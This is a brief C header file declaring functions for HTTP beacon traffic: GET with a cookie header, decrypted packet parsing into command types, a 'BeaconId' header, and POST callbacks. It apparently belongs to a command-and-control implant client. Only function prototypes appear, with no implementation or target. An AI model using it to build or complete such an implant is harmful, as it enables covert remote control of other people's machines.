#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "Command.h"

unsigned char* parseGetResponse(unsigned char* data, size_t dataSize, size_t* responsedatalen);
unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLen, uint32_t* commandType, size_t* commandBuflen , size_t* jia);
unsigned char* GET(wchar_t* cookie_header, size_t* responseSize);
unsigned char* makeBeaconIdHeader();
unsigned char* makePostData(unsigned char* postMsg, size_t msgLen, int callback);
BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeader);